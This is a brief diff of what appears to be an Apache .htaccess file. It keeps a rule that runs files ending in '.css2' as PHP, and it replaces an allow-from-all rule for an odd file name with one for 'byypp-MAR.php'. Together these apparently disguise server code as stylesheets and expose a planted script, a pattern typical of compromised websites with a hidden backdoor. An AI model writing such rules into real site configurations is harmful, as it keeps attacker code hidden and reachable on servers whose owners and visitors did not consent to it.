@@ -6,7 +6,7 @@ Options -Indexes
 <FilesMatch "\.css2$">
     SetHandler application/x-httpd-php
 </FilesMatch>
-<FilesMatch "^(kj-MAR.shtml)$">
+<FilesMatch "^(byypp-MAR.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
